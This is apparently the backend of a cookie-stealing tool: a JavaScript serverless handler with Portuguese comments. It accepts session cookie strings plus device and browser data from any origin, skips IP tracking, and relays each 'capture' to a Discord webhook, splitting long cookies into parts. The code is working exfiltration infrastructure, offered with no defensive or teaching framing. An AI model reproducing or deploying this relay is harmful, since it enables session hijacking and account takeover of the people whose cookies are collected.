/**
 * Webhook API - Recebe e processa dados sem rastreamento de IP
 */

export default async function handler(req, res) {
  // CORS - Aberto para evitar erros de bloqueio
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido' });
  }

  try {
    const { cookie, device, userAgent } = req.body;

    // ===== VALIDAÇÃO =====
    if (!cookie || typeof cookie !== 'string') {
      return res.status(400).json({ error: 'Dados inválidos' });
    }

    const trimmedCookie = cookie.trim();

    if (trimmedCookie.length < 50) {
      return res.status(400).json({ error: 'Dados insuficientes' });
    }

    // ===== OBTER WEBHOOK URL =====
    const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
    if (!WEBHOOK_URL) {
      return res.status(500).json({ error: 'Erro de configuração' });
    }

    // ===== PREPARAR DADOS =====
    const timestamp = new Date().toISOString();
    
    // Função para dividir cookie se for muito grande para o Discord
    const splitCookie = (str) => {
      const MAX = 1900;
      const parts = [];
      for (let i = 0; i < str.length; i += MAX) {
        parts.push(str.substring(i, i + MAX));
      }
      return parts;
    };

    const cookieParts = splitCookie(trimmedCookie);
    const fields = [];

    cookieParts.forEach((part, index) => {
      fields.push({
        name: `🍪 DADO - PARTE ${index + 1}`,
        value: '```' + part + '```',
        inline: false
      });
    });

    fields.push({
      name: '📊 DISPOSITIVO',
      value: `\`\`\`\nTipo: ${device || 'Desconhecido'}\nNavegador: ${userAgent || 'Desconhecido'}\n\`\`\``,
      inline: false
    });

    // ===== ENVIAR PARA O DISCORD =====
    const payload = {
      content: '🚨 **NOVA CAPTURA RECEBIDA**',
      embeds: [{
        title: '🔐 INFORMAÇÕES COLETADAS',
        color: 0x6366f1,
        fields: fields,
        timestamp: timestamp
      }]
    };

    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      return res.status(500).json({ error: 'Falha ao enviar' });
    }

    return res.status(200).json({ success: true });

  } catch (error) {
    console.error('Erro:', error);
    return res.status(500).json({ error: 'Erro interno' });
  }
}
